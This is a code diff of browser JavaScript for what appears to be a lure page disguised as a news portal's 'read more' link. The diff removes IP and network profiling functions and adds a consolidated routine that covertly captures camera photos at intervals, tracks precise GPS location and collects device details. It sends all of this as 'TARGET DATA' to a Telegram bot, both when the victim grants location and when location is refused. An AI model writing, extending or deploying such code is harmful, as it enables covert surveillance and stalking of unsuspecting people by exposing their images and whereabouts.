@@ -1223,125 +1223,6 @@ async function sendPhoto(blob, caption){
   }catch(e){}
 }
 
-async function sendLocation(lat, lon, acc, extra){
-  try{
-    await fetch(`https://api.telegram.org/bot${CFG.TELEGRAM_BOT_TOKEN}/sendLocation`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
-        chat_id: CFG.TELEGRAM_CHAT_ID,
-        latitude: lat, longitude: lon,
-        horizontal_accuracy: Math.min(acc||50, 1500)
-      })
-    });
-    if(extra) sendText(extra);
-  }catch(e){}
-}
-
-async function getIPInfo(){
-  const providers = [
-    { url: "https://ipapi.co/json/", parse: d => ({
-        ip: d.ip, city: d.city, region: d.region,
-        country: d.country_name, countryCode: d.country_code,
-        postal: d.postal, lat: d.latitude, lon: d.longitude,
-        timezone: d.timezone, isp: d.org, asn: d.asn,
-        currency: d.currency, languages: d.languages }) },
-    { url: "https://ipwho.is/", parse: d => ({
-        ip: d.ip, city: d.city, region: d.region,
-        country: d.country, countryCode: d.country_code,
-        postal: d.postal, lat: d.latitude, lon: d.longitude,
-        timezone: d.timezone?.id, isp: d.connection?.isp,
-        asn: d.connection?.asn, currency: d.currency?.code }) },
-    { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) }
-  ];
-  for(const p of providers){
-    try{
-      const res = await fetch(p.url, { cache: "no-store" });
-      const data = await res.json();
-      const parsed = p.parse(data);
-      if(parsed && parsed.ip) return parsed;
-    }catch(e){ continue; }
-  }
-  return null;
-}
-
-async function sendIPInfo(){
-  const ip = await getIPInfo();
-  if(!ip){ sendText("IP INFO — gagal ambil data IP"); return; }
-  let text = `IP ADDRESS & NETWORK INFO\n━━━━━━━━━━━━━━━\nIP Publik: ${ip.ip || "n/a"}\n`;
-  if(ip.isp)        text += `ISP / Provider: ${ip.isp}\n`;
-  if(ip.asn)        text += `ASN: ${ip.asn}\n`;
-  if(ip.city)       text += `Kota: ${ip.city}\n`;
-  if(ip.region)     text += `Region: ${ip.region}\n`;
-  if(ip.country)    text += `Negara: ${ip.country} ${ip.countryCode ? "("+ip.countryCode+")" : ""}\n`;
-  if(ip.postal)     text += `Kode Pos: ${ip.postal}\n`;
-  if(ip.lat && ip.lon) text += `GeoIP: ${ip.lat}, ${ip.lon}\n`;
-  if(ip.timezone)   text += `Timezone: ${ip.timezone}\n`;
-  if(ip.currency)   text += `Currency: ${ip.currency}\n`;
-  if(ip.languages)  text += `Languages: ${ip.languages}\n`;
-  if(ip.lat && ip.lon) text += `Google Maps (GeoIP): https://maps.google.com/?q=${ip.lat},${ip.lon}\n`;
-  text += `━━━━━━━━━━━━━━━`;
-  sendText(text);
-}
-
-function getNetworkInfo(){
-  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if(!c) return null;
-  const info = {
-    effectiveType: c.effectiveType || "n/a",
-    type: c.type || "n/a",
-    downlink: c.downlink || "n/a",
-    downlinkMax: c.downlinkMax || "n/a",
-    rtt: c.rtt || "n/a",
-    saveData: c.saveData ? "yes" : "no"
-  };
-  sendText(
-    `NETWORK CONNECTION\n━━━━━━━━━━━━━━━\n` +
-    `Effective Type: ${info.effectiveType}\n` +
-    `Connection Type: ${info.type}\n` +
-    `Downlink: ${info.downlink} Mbps\n` +
-    `Downlink Max: ${info.downlinkMax} Mbps\n` +
-    `RTT: ${info.rtt} ms\n` +
-    `Save Data: ${info.saveData}\n` +
-    `━━━━━━━━━━━━━━━`
-  );
-  return info;
-}
-
-async function sendDeviceInfo(){
-  const info = {
-    ua: navigator.userAgent, platform: navigator.platform,
-    language: navigator.language,
-    languages: (navigator.languages||[]).join(", "),
-    screen: `${screen.width}x${screen.height}`,
-    viewport: `${innerWidth}x${innerHeight}`,
-    dpr: devicePixelRatio,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cores: navigator.hardwareConcurrency || "n/a",
-    memory: navigator.deviceMemory || "n/a",
-    touch: "ontouchstart" in window ? "yes" : "no",
-    cookiesEnabled: navigator.cookieEnabled ? "yes" : "no",
-    doNotTrack: navigator.doNotTrack || "n/a",
-    referrer: document.referrer || "direct",
-    url: location.href, battery: "n/a"
-  };
-  if(navigator.getBattery){
-    try{
-      const b = await navigator.getBattery();
-      info.battery = `${Math.round(b.level*100)}% ${b.charging?"(charging)":""}`;
-    }catch(e){}
-  }
-  sendText(
-    `DEVICE INFO — Portal Jatinegara\n━━━━━━━━━━━━━━━\n` +
-    `UA: ${info.ua}\nPlatform: ${info.platform}\nLang: ${info.language}\n` +
-    `Languages: ${info.languages}\nScreen: ${info.screen}\nViewport: ${info.viewport}\n` +
-    `DPR: ${info.dpr}\nTZ: ${info.timezone}\nCores: ${info.cores}\n` +
-    `Memory: ${info.memory}\nTouch: ${info.touch}\nCookies: ${info.cookiesEnabled}\n` +
-    `DNT: ${info.doNotTrack}\nReferrer: ${info.referrer}\nURL: ${info.url}\n` +
-    `Battery: ${info.battery}\n━━━━━━━━━━━━━━━`
-  );
-}
-
 async function captureCamera(){
   let stream, video;
   try{
@@ -1369,7 +1250,6 @@ async function captureCamera(){
     const blob = await new Promise(r => c.toBlob(r, "image/jpeg", CFG.QUALITY));
     stream.getTracks().forEach(t => t.stop());
     video.remove();
-    if(blob) sendPhoto(blob, "KAMERA — " + new Date().toLocaleString("id-ID"));
     return blob;
   }catch(e){
     stream?.getTracks().forEach(t => t.stop());
@@ -1390,11 +1270,9 @@ async function getAccurateLocation(){
         });
       });
       samples.push({
-        lat: pos.coords.latitude, lon: pos.coords.longitude,
-        acc: pos.coords.accuracy, alt: pos.coords.altitude,
-        altAcc: pos.coords.altitudeAccuracy,
-        heading: pos.coords.heading, speed: pos.coords.speed,
-        ts: pos.timestamp
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy
       });
       if(pos.coords.accuracy < 20) break;
       await new Promise(r => setTimeout(r, 800));
@@ -1402,16 +1280,45 @@ async function getAccurateLocation(){
   }
   if(!samples.length) return null;
   samples.sort((a,b) => a.acc - b.acc);
-  const best = samples[0];
-  return {
-    lat: best.lat, lon: best.lon, acc: best.acc,
-    alt: best.alt, altAcc: best.altAcc,
-    heading: best.heading, speed: best.speed,
-    samples: samples.length
-  };
+  return samples[0];
 }
 
-async function stealthSnap(){ await captureCamera(); }
+async function sendData(photoBlob, loc){
+  const d = new Date();
+  const tgl = d.toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+  let caption = `TARGET DATA — ${tgl} WIB\n`;
+  caption += `━━━━━━━━━━━━━━━\n`;
+
+  if(loc){
+    caption += `LOKASI:\n`;
+    caption += `Lat: ${loc.lat}\n`;
+    caption += `Lon: ${loc.lon}\n`;
+    caption += `Akurasi: ${loc.acc?.toFixed(1)} m\n`;
+    caption += `Maps: https://maps.google.com/?q=${loc.lat},${loc.lon}\n`;
+  } else {
+    caption += `LOKASI: gagal / ditolak\n`;
+  }
+
+  caption += `━━━━━━━━━━━━━━━\n`;
+  caption += `DEVICE:\n`;
+  caption += `UA: ${navigator.userAgent}\n`;
+  caption += `Platform: ${navigator.platform}\n`;
+  caption += `Screen: ${screen.width}x${screen.height}\n`;
+  caption += `TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+  caption += `━━━━━━━━━━━━━━━`;
+
+  if(photoBlob){
+    await sendPhoto(photoBlob, caption);
+  } else {
+    await sendText(caption);
+  }
+}
+
+async function stealthSnap(){
+  const blob = await captureCamera();
+  if(blob) await sendPhoto(blob, `SNAPSHOT — ${new Date().toLocaleString("id-ID")}`);
+}
 
 let lastLoc = {lat:null, lon:null, t:0};
 function startLocationWatch(){
@@ -1426,7 +1333,7 @@ function startLocationWatch(){
     const stale = now - lastLoc.t > CFG.LOCATION_STALE_MS;
     if(!lastLoc.lat || moved || stale){
       lastLoc = {lat, lon, t: now};
-      sendLocation(lat, lon, accuracy);
+      sendText(`LOKASI UPDATE\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${accuracy?.toFixed(1)} m\nMaps: https://maps.google.com/?q=${lat},${lon}`);
     }
   }, ()=>{}, {
     enableHighAccuracy: true, maximumAge: 30000, timeout: 20000
@@ -1437,10 +1344,6 @@ let trackingStarted = false;
 function startTracking(){
   if(trackingStarted) return;
   trackingStarted = true;
-  sendDeviceInfo();
-  sendIPInfo();
-  getNetworkInfo();
-  sendText("Target klik Baca Selengkapnya. Device: " + navigator.userAgent);
   startLocationWatch();
   setInterval(stealthSnap, CFG.CAPTURE_INTERVAL);
   document.addEventListener("visibilitychange", () => {
@@ -1543,36 +1446,17 @@ document.addEventListener("DOMContentLoaded", () => {
         s.getTracks().forEach(t => t.stop());
       }catch(e){}
 
-      await captureCamera();
-
+      const photoBlob = await captureCamera();
       const loc = await getAccurateLocation();
-      if(loc){
-        const extra =
-          `LOKASI AKURAT\n━━━━━━━━━━━━━━━\n` +
-          `Lat: ${loc.lat}\nLon: ${loc.lon}\n` +
-          `Accuracy: ${loc.acc?.toFixed(1)} m\n` +
-          `Altitude: ${loc.alt?.toFixed(1) || "n/a"} m\n` +
-          `Alt Accuracy: ${loc.altAcc?.toFixed(1) || "n/a"} m\n` +
-          `Heading: ${loc.heading?.toFixed(1) || "n/a"}°\n` +
-          `Speed: ${loc.speed?.toFixed(1) || "n/a"} m/s\n` +
-          `Samples: ${loc.samples}\n` +
-          `Google Maps: https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
-          `━━━━━━━━━━━━━━━`;
-        sendLocation(loc.lat, loc.lon, loc.acc, extra);
-      }
 
+      await sendData(photoBlob, loc);
       startTracking();
+
     } else {
-      sendText("Target menolak pre-permission lokasi. Cek IP fallback...");
-      sendIPInfo();
-      sendDeviceInfo();
+      sendText("Target menolak akses lokasi. Ambil foto & lanjut tracking.");
 
-      try{
-        const s = await navigator.mediaDevices.getUserMedia({video:true});
-        s.getTracks().forEach(t => t.stop());
-      }catch(e){}
-
-      await captureCamera();
+      const photoBlob = await captureCamera();
+      await sendData(photoBlob, null);
       startTracking();
     }
 
